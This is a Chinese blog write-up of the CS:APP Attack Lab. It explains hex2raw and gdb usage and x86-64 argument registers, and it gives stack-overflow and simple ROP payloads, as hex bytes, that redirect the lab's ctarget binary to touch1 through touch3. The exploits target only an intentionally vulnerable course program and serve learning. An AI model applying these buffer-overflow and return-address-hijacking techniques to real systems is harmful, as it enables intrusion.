---
layout:     post
title:      csapp-attacklab
subtitle:   csapp-lab
date:       2020-07-28
author:     X1ng
header-img: csapp_lab3.jpg
catalog: true
tags:

- lab
- csapp




---

开始没有pwn的工具不知所措，参考了别的师傅的博客才知道给出的文件使用方法

我在2020年7月23日到28日下载的实验文件里给出的ctarget和rtarget是两个一样的文件，所以相当于只完成了半个实验。。

## 实验辅助

hex2raw的使用说明

要求输入是一个十六进制格式的字符串，用两个十六进制数字表示一个字节值，字节值之间以空白符（空格或新行）分隔，注意使用小端法字节序。

将攻击字符串存入文件中，如attack.txt

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh6s6t1shjj30gw08at8s.jpg)

然后用下述方法调用：

1.`cat attack.txt | ./hex2raw | ./ctarget`

2.`./hex2raw <attack.txt> attackraw.txt`

`./ctarget < attackraw.txt`或 `./ctarget -i attackraw.txt`

3.结合gdb使用

`./hex2raw <attack.txt> attackraw.txt`

`gdb ctarget`

(gdb) `run < attackraw.txt` 或 (gdb) `run -i attackraw.txt`

生成字节代码操作

编写一个汇编文件：

vim attack.s

汇编和反汇编此文件：

gcc -c attack.s

objdump -d attack.o > attack.d

由此推出这段代码的字节序列。

涉及的gdb命令

(gdb) r run的简写，运行被调试的程序。若有断点，则程序暂停在第一个可用断点处。

(gdb) c continue的简写，继续执行被调试程序，直至下一个断点或程序结束。

(gdb) print <指定变量> 显示指定变量的值。

(gdb) break *<代码地址> 设置断点。

(gdb) x/<n/f/u> <addr> examine的简写，查看内存地址中的值。

————————————————

版权声明：CSDN博主「_Silvia」的原创文章，原文链接：https://blog.csdn.net/qq_36894564/article/details/72863319

## 前置知识

需要了解函数调用、栈溢出相关知识

32位下函数调用——[手把手教你栈溢出从入门到放弃](https://zhuanlan.zhihu.com/p/25816426)

64位函数调用的传参方式不同于32位

当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9

当参数为7个以上时，前6个同上，剩下的参数与32位一样从右往左压栈

如调用H(a, b, c, d, e, f, g, h);

a->%rdi, b->%rsi, c->%rdx, d->%rcx, e->%r8, f->%r9		h->8(%esp)		g->(%esp)

再call H

## attacklab

相关函数逻辑就是提供一个Cookie再输入通过getbuf()往栈中输入一个字符串，存在溢出漏洞，可以控制`ret`返回地址

需要加`-q`参数运行ctarget程序

### touch1

在getbuf()中可以看到`sub rsp,0x28`可知栈长度为0x28

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh6rugo2v6j314u0cqdk7.jpg)

输入字符串"aaaaaaaa"，可以看到输入字符串的内存单元正好时rsp指向的内存单元

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh6skh2m80j319s0ictdq.jpg)

所以只要输入`'a'*0x28+(address)`即可控制程序流，填充为touch1()地址，即可执行touch1()

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh6sk2bii1j31n60h4gol.jpg)

payload:

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00		//touch1
```

（小端序）

pass

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh6skrwyp2j31ea09mtbq.jpg)

### touch2

找到touch2的地址

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh6ssfzyk4j31ms0t4jy0.jpg)

可以看到

`cmp     edi, cs:cookie`

即 将第一个参数（rdi中的数据）与cookie比较

用ROPgadget搜索gadgets

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh72vhbv1rj315y0u0qdf.jpg)

找到`0x000000000040141b	:	pop rdi	;	ret`

payload:

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
1b 14 40 00 00 00 00 00		//pop rdi;ret;
fa 97 b9 59 00 00 00 00		//cookie
ec 17 40 00 00 00 00 00		//touch2
```

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh738pd9qwj31ee0a8dj8.jpg)

### touch3

有点迷，跳转touch3后各种操作，最后发现就是比较 调用touch3的参数作为地址的字符串 与cookie（总觉得是个非预期）

若payload为

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
1b 14 40 00 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
```

则

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh72xssb74j316o0h40zb.jpg)

然后Segmentation fault

所以payload:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
1b 14 40 00 00 00 00 00   //pop rdi;ret;
23 dc 61 55 00 00 00 00   //&cookie
fa 18 40 00 00 00 00 00   //touch3
```

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh738h1nsnj31400ge457.jpg)

pass

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gh7388kbzoj31e80a8whw.jpg)
